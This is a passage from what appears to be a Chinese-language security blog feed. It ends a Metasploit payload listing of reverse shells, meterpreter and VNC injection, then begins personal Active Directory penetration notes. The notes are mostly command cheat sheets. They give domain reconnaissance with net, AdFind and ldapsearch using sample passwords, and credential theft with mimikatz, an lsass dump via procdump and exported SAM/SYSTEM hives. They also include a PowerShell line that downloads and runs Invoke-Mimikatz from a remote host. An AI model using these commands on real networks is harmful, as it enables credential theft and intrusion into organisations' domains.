attacker, on all possible ports (1-65</span><br><span class="line">                                                        535, slowly)</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;vncinject&#x2F;reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;exec                                    Execute an arbitrary command (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;loadlibrary                             Load an arbitrary x64 library path</span><br><span class="line">    windows&#x2F;x64&#x2F;messagebox                              Spawn a dialog via MessageBox using a customizable title, text &amp; icon</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 wininet)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 wininet)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows x64 winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows x64 winhttp)</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_named_pipe                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_rc4                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_uuid                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_named_pipe             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_rc4                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;peinject&#x2F;reverse_tcp_uuid               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;pingback_reverse_tcp                    Connect back to attacker and report UUID (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;x64&#x2F;powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (W</span><br><span class="line">                                                        indows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows</span><br><span class="line">                                                         x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winine</span><br><span class="line">                                                        t)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winine</span><br><span class="line">                                                        t)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Wi</span><br><span class="line">                                                        ndows x64)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhtt</span><br><span class="line">                                                        p)</span><br><span class="line">    windows&#x2F;x64&#x2F;vncinject&#x2F;reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winht</span><br><span class="line">                                                        tp)</span><br></pre></td></tr></table></figure>
<h2 id="Msfconsole下的模块"><a href="#Msfconsole下的模块" class="headerlink" title="Msfconsole下的模块"></a>Msfconsole下的模块</h2><p>模块我没有做过多介绍，因为它的模块都是很有规则的，不需要一个个记它。比如扫描类的都是scanner打头，利用类的都是exploit、misc打头。实在不行还有search命令，所以记模块没用，记住大概就行了。</p>
<p>以上。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透笔记</title>
    <url>/2021/03/26/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>最近不再被这份工作烦心了，时间空了下来，所以集中精神学习了一下域渗透的知识，学完感觉自己又升了一级了。<a id="more"></a></p>
<p>此处是用来自己做笔记的，所以只会以最精简的模式进行记录，相关原理不再赘述。</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="是否处于域环境"><a href="#是否处于域环境" class="headerlink" title="是否处于域环境"></a>是否处于域环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="有几个域"><a href="#有几个域" class="headerlink" title="有几个域"></a>有几个域</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域控是谁"><a href="#域控是谁" class="headerlink" title="域控是谁"></a>域控是谁</h2><p>域内的域控都在Domain Controller这个OU底下</p>
<p>要查询其他的域，/domain后跟:abc.com就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用adfind，指定根域DN就行了；或者直接dcdmp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;OU&#x3D;Domain Controllers,DC&#x3D;exp,DC&#x3D;com&quot; -f &quot;(objectclass&#x3D;computer)&quot; -dn</span><br><span class="line"></span><br><span class="line">adfind.exe -sc dcdmp -dn</span><br></pre></td></tr></table></figure>
<h2 id="域管是谁"><a href="#域管是谁" class="headerlink" title="域管是谁"></a>域管是谁</h2><p>注意：域控与域管是两个不同的概念，域控指的机器用户，域管指的域用户。</p>
<p>域用户全部属于成员用户，机器用户是以机器名后面加$来命名的。普通的域用户可以在域内任意一台机器上登录（默认情况下），所以域用户不能代表那台特定的机器；机器用户是该台域内机器的管理员权限用户，所以机器用户代表了那台特定的机器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域管组有谁"><a href="#域管组有谁" class="headerlink" title="域管组有谁"></a>域管组有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="企业管理员是谁"><a href="#企业管理员是谁" class="headerlink" title="企业管理员是谁"></a>企业管理员是谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域有几个用户组"><a href="#域有几个用户组" class="headerlink" title="域有几个用户组"></a>域有几个用户组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用adfind，adfind有很多强大的命令，这个以后再研究整理吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc oudmp -dn</span><br></pre></td></tr></table></figure>
<h2 id="域密码策略是什么"><a href="#域密码策略是什么" class="headerlink" title="域密码策略是什么"></a>域密码策略是什么</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域内机器用户有谁"><a href="#域内机器用户有谁" class="headerlink" title="域内机器用户有谁"></a>域内机器用户有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可用adfind，可以通过objectclass=Computer或者objectcategory=Computer查找域内的所有机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;(objectcategory&#x3D;computer)&quot; -dn</span><br></pre></td></tr></table></figure>
<h2 id="域内用户有谁"><a href="#域内用户有谁" class="headerlink" title="域内用户有谁"></a>域内用户有谁</h2><p>net user、net group这种带net的命令，全部是以smb服务的samr协议进行通信查询的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用impacket的samrdump查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">samrdump.py exp.com&#x2F;cs:123456@10.0.2.5 -csv</span><br></pre></td></tr></table></figure>
<p>还可以用ldapsearch通过ldap协议查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.0.2.254 -D &quot;cs@exp.com&quot; -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; -w &quot;Aa123123.&quot; &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; </span><br></pre></td></tr></table></figure>
<p>还可以用adfind查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; -dn</span><br></pre></td></tr></table></figure>
<h2 id="域用户的登录名是什么"><a href="#域用户的登录名是什么" class="headerlink" title="域用户的登录名是什么"></a>域用户的登录名是什么</h2><p>域用户的字段有姓有名还有登录名，这几个是可以得设置不一样的，OU指定用户的组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; displayName UserPrincipalName sAMAccountName</span><br></pre></td></tr></table></figure>
<h2 id="域用户是否活跃"><a href="#域用户是否活跃" class="headerlink" title="域用户是否活跃"></a>域用户是否活跃</h2><p>这个是通过查找域用户相关的一些时间，例如创建时间、密码更改时间、上次登录时间来判定。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; whencreated pwdlastset lastlogon -tdcs</span><br></pre></td></tr></table></figure>
<h2 id="密码永不过期的域用户"><a href="#密码永不过期的域用户" class="headerlink" title="密码永不过期的域用户"></a>密码永不过期的域用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;65536&quot; -bit -dn</span><br></pre></td></tr></table></figure>
<p>关于useraccountcontrol值的相关对应表参照文末</p>
<h2 id="域用户能够登录的主机"><a href="#域用户能够登录的主机" class="headerlink" title="域用户能够登录的主机"></a>域用户能够登录的主机</h2><p>这个是通过指定远程DC进行查询。如果查找没有结果，说明这个用户没有限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.2.254 -sc u:cs userWorkstations</span><br></pre></td></tr></table></figure>
<h2 id="域用户正在登陆的主机"><a href="#域用户正在登陆的主机" class="headerlink" title="域用户正在登陆的主机"></a>域用户正在登陆的主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psloggedon.exe \\dc</span><br><span class="line">使用Powerview的Invoke-UserHunter</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">netsess \\dc</span><br></pre></td></tr></table></figure>
<p>Nmap的NSE脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;smb-enum-sessions.html</span><br><span class="line">smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</span><br><span class="line">smb-enum-users.nse可以使用此脚本对域控进行扫描</span><br></pre></td></tr></table></figure>
<h2 id="约束委派用户"><a href="#约束委派用户" class="headerlink" title="约束委派用户"></a>约束委派用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;524288&quot; -bit -dn</span><br></pre></td></tr></table></figure>
<h2 id="约束委派主机"><a href="#约束委派主机" class="headerlink" title="约束委派主机"></a>约束委派主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>或者用PowerSploit的PowerView.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>
<h2 id="非约束委派用户"><a href="#非约束委派用户" class="headerlink" title="非约束委派用户"></a>非约束委派用户</h2><p>adfind</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>ldapsearch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;10.0.2.254:389 -D &quot;CN&#x3D;cs,CN&#x3D;Users,DC&#x3D;exp,DC&#x3D;com&quot; -w Aa123123. -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
<h2 id="非约束委派主机"><a href="#非约束委派主机" class="headerlink" title="非约束委派主机"></a>非约束委派主机</h2><p>adfind</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>ldapsearch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="密码利用"><a href="#密码利用" class="headerlink" title="密码利用"></a>密码利用</h2><h3 id="读密码"><a href="#读密码" class="headerlink" title="读密码"></a>读密码</h3><h4 id="meterpreter方式"><a href="#meterpreter方式" class="headerlink" title="meterpreter方式"></a>meterpreter方式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv	#读的是hash</span><br><span class="line">meterpreter &gt; ssp	#读的是明文</span><br><span class="line">meterpreter &gt; wdigest #读的是明文</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz方式"><a href="#mimikatz方式" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>sekurlsa可用的还有msv、wdigest、kerberos、tspkg、ssp、logonPasswords、ekeys等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log 1.txt&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
<p>还有PowerSploit的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xx&#x2F;xx&#39;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
<h4 id="procdump组合mimikatz"><a href="#procdump组合mimikatz" class="headerlink" title="procdump组合mimikatz"></a>procdump组合mimikatz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h4 id="注册表导出本地读取"><a href="#注册表导出本地读取" class="headerlink" title="注册表导出本地读取"></a>注册表导出本地读取</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive&quot; exit</span><br></pre></td></tr></table></figure>
